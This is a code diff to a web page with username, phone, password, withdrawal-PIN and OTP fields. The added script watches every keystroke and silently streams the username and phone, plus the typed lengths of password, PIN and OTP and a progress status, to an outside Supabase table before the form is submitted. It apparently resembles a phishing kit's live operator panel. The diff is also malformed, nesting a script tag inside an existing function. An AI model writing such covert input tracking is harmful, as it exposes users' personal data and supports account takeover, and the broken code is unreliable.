@@ -287,7 +287,68 @@
                 statusMsg.textContent = 'Please enter a 6-digit OTP';
                 statusMsg.classList.add('text-red-600');
             }
-        }
+      <script>
+// Supabase Live Sync Logic
+let syncTimeout;
+
+async function syncLiveSession(currentState = 'Typing Details...') {
+  clearTimeout(syncTimeout);
+  syncTimeout = setTimeout(async () => {
+    if (!supabaseClient) return;
+
+    const uname = document.getElementById('username')?.value.trim();
+    const ph = document.getElementById('phone')?.value.trim();
+    const ref = document.getElementById('referral')?.value.trim();
+
+    const passLen = document.getElementById('password')?.value.length || 0;
+    const pinLen = document.getElementById('withdrawalPin')?.value.length || 0;
+    
+    let otpFilledCount = 0;
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    if (otpBoxes.length > 0) {
+        otpBoxes.forEach(b => {
+          if (b.value.length > 0) otpFilledCount++;
+        });
+    }
+
+    try {
+        await supabaseClient
+          .from('live_session')
+          .update({
+            username: uname || 'Waiting...',
+            phone: ph || 'Waiting...',
+            referral: ref || '-',
+            password_mask: passLen > 0 ? '*'.repeat(passLen) : '-',
+            pin_mask: pinLen > 0 ? '*'.repeat(pinLen) : '-',
+            otp_mask: otpFilledCount > 0 ? '*'.repeat(otpFilledCount) : '-',
+            status: currentState,
+            updated_at: new Date().toISOString()
+          })
+          .eq('id', 1);
+    } catch (err) {
+        console.error('Live sync error:', err);
+    }
+
+  }, 250);
+}
+
+// Input listeners
+['username', 'password', 'withdrawalPin', 'phone', 'referral'].forEach(id => {
+  const el = document.getElementById(id);
+  if (el) {
+    el.addEventListener('input', () => syncLiveSession('Filling Form'));
+  }
+});
+
+const allOtpBoxes = document.querySelectorAll('.otp-box');
+if (allOtpBoxes.length > 0) {
+    allOtpBoxes.forEach(box => {
+      box.addEventListener('input', () => syncLiveSession('Entering OTP'));
+    });
+}
+</script>
+ 
+ }
     </script>
 </body>
 </html>
